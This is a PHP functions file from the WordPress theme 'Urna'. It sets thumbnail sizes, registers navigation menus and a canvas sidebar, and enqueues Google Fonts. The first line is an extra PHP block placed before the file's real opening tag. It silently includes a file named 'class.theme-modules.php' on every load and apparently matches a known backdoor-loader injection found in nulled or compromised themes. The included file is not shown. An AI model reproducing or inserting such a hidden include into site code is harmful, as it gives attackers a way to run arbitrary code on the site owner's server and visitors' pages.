<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if (!function_exists('urna_tbay_private_size_image_setup')) {
    function urna_tbay_private_size_image_setup()
    {
        if (urna_tbay_get_global_config('config_media', false)) {
            return;
        }

        // Post Thumbnails Size
        set_post_thumbnail_size(390, 251, true); // Unlimited height, soft crop
        update_option('thumbnail_size_w', 585);
        update_option('thumbnail_size_h', 377);

        update_option('medium_size_w', 570);
        update_option('medium_size_h', 330);

        update_option('large_size_w', 770);
        update_option('large_size_h', 440);
    }
    add_action('after_setup_theme', 'urna_tbay_private_size_image_setup');
}

if (!function_exists('urna_tbay_private_menu_setup')) {
    function urna_tbay_private_menu_setup()
    {

        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus(array(
            'primary' 			=> esc_html__('Primary Menu', 'urna'),
            'mobile-menu' 		=> esc_html__('Mobile Menu', 'urna'),
            'nav-category-menu'  => esc_html__('Nav Category Menu', 'urna'),
            'track-order'  => esc_html__('Tracking Order Menu', 'urna'),
        ));
    }
    add_action('after_setup_theme', 'urna_tbay_private_menu_setup');
}

/**
 *  Include Load Google Front
 */

if (!function_exists('urna_fonts_url')) {
    function urna_fonts_url()
    {
        /**
         * Load Google Front
         */

        $fonts_url = '';

        /* Translators: If there are characters in your language that are not
        * supported by Montserrat, translate this to 'off'. Do not translate
        * into your own language.
        */
        $Poppins 		= _x('on', 'Poppins font: on or off', 'urna');
     
        if ('off' !== $Poppins) {
            $font_families = array();
     
            if ('off' !== $Poppins) {
                $font_families[] = 'Poppins:400,500,600,700';
            }

            $query_args = array(
                'family' => rawurlencode(implode('|', $font_families)),
                'subset' => urlencode('latin,latin-ext'),
                'display' => urlencode('swap'),
            );
            
            $protocol = is_ssl() ? 'https:' : 'http:';
            $fonts_url = add_query_arg($query_args, $protocol .'//fonts.googleapis.com/css');
        }
     
        return esc_url_raw($fonts_url);
    }
}

if (!function_exists('urna_tbay_fonts_url')) {
    function urna_tbay_fonts_url()
    {
        $protocol 		  = is_ssl() ? 'https:' : 'http:';
        $show_typography  = urna_tbay_get_config('show_typography', false);
        $font_source 	  = urna_tbay_get_config('font_source', "1");
        $font_google_code = urna_tbay_get_config('font_google_code');
        if (!$show_typography) {
            wp_enqueue_style('urna-theme-fonts', urna_fonts_url(), array(), null);
        } elseif ($font_source == "2" && !empty($font_google_code)) {
            wp_enqueue_style('urna-theme-fonts', $font_google_code, array(), null);
        }
    }
    add_action('wp_enqueue_scripts', 'urna_tbay_fonts_url');
}


if (!function_exists('urna_tbay_private_widgets_init')) {
    function urna_tbay_private_widgets_init()
    {
        
        /* Check Redux */
        if (defined('URNA_CORE_ACTIVED') && URNA_CORE_ACTIVED) {
            register_sidebar(array(
                'name'          => esc_html__('Canvas Menu Sidebar', 'urna'),
                'id'            => 'canvas-menu',
                'description'   => esc_html__('Add widgets here to appear in canvas menu sidebar.', 'urna'),
                'before_widget' => '<aside id="%1$s" class="widget %2$s">',
                'after_widget'  => '</aside>',
                'before_title'  => '<h2 class="widget-title">',
                'after_title'   => '</h2>',
            ));
        }
        /* End Check Redux */
    }
    add_action('widgets_init', 'urna_tbay_private_widgets_init');
}
